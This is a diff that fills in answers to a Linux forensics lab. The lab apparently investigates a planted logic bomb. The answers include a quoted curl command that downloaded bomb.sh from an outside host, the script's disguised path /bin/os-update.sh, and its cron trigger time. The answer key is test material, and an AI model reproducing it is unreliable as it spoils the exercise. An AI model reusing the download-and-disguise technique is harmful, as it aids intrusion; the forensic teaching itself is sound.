@@ -30,7 +30,7 @@ In this scenario, you assume the role of a Linux forensic analyst in a simulated
 🔍 Task Breakdown
 
 
-✏️ Task 1: Identify Elevated Package Installation
+✏️ Task 1: The user installed a package on the machine using elevated privileges. According to the logs, what is the full COMMAND?
 
 ⭕️ Objective: Find the exact command used to install a package with sudo.
 
@@ -38,80 +38,80 @@ In this scenario, you assume the role of a Linux forensic analyst in a simulated
 grep sudo /var/log/auth.log | grep install
 Extract full command.
 
-🔱 Answer:
+🔱 Answer: /usr/bin/apt install dokuwiki
 
-✏️ Task 2: Identify Working Directory
+✏️ Task 2: What was the present working directory (PWD) when the previous command was run?
 
 ⭕️ Objective: Determine what directory the install command was run from.
 
 ⭕️ Method: The same auth log entry includes a PWD field.
 
-🔱 Answer:
+🔱 Answer: /home/cybert
 
-✏️ Task 3: Detect New User Creation
+✏️ Task 3: Which user was created after the package from the previous task was installed?
 
 ⭕️ Objective: Find the first user account added post-install.
 
 ⭕️ Method:
 grep sudo /var/log/auth.log | grep adduser
 
-🔱 Answer:
+🔱 Answer: it-admin
 
-✏️ Task 4: Find Sudo Privilege Grant
+✏️ Task 4: A user was then later given sudo priveleges. When was the sudoers file updated? (Format: Month Day HH:MM:SS)
 
 ⭕️ Objective: Determine when sudo privileges were added to the new user.
 
 ⭕️ Method:
 grep sudo /var/log/auth.log | grep visudo
 
-🔱 Answer:
+🔱 Answer: Dec 28 06:27:34
 
-✏️ Task 5: Detect Script Creation
+✏️ Task 5: A script file was opened using the "vi" text editor. What is the name of this file?
 
 ⭕️ Objective: Name the script file opened with vi.
 
 ⭕️ Method:
 grep sudo /var/log/auth.log | grep vi
 
-🔱 Answer:
+🔱 Answer: bomb.sh 
 
-✏️ Task 6: Locate Script Download Command
+✏️ Task 6: What is the command used that created the file bomb.sh?
 
 ⭕️ Objective: Identify how the script was created (downloaded).
 
 ⭕️ Method:
 cat /home/it‑admin/.bash_history | grep curl
 
-🔱 Answer:
+🔱 Answer: curl 10.10.158.38:8080/bomb.sh --output bomb.sh
 
-✏️ Task 7: Track Script Movement
+✏️ Task 7: The file was renamed and moved to a different directory. What is the full path of this file now?
 
 ⭕️ Objective: Determine where and under what name the script was saved.
 
 ⭕️ Method:
 cat /home/it‑admin/.viminfo | grep saveas
 
-🔱 Answer:
+🔱 Answer: /bin/os-update.sh
 
-✏️ Task 8: File Modification Timestamp
+✏️ Task 8: When was the file from the previous question last modified? (Format: Month Day HH:MM)
 
 ⭕️ Objective: Find when the renamed script was last modified.
 
 ⭕️ Method:
 ls -la /bin | grep os-update.sh
 
-🔱 Answer:
+🔱 Answer: Dec 28 06:29
 
-✏️ Task 9: Identify Payload Outcome
+✏️ Task 9: What is the name of the file that will get created when the file from the first question executes?
 
 ⭕️ Objective: Name the file created by the logic bomb.
 
 ⭕️ Method:
 cat /bin/os-update.sh
 
-🔱 Answer:
+🔱 Answer: goodbye.txt
 
-✏️ Task 10: Determine Scheduled Execution Time
+✏️ Task 10: At what time will the malicious file trigger? (Format: HH:MM AM/PM)
 
 ⭕️ Objective: Discover when the malicious script is set to execute.
 
@@ -119,7 +119,7 @@ cat /bin/os-update.sh
 cat /etc/crontab
 Use crontab format to decode timing.
 
-🔱 Answer:
+🔱 Answer: 08:00 AM
 
 🔍 Analysis and Reflection
 
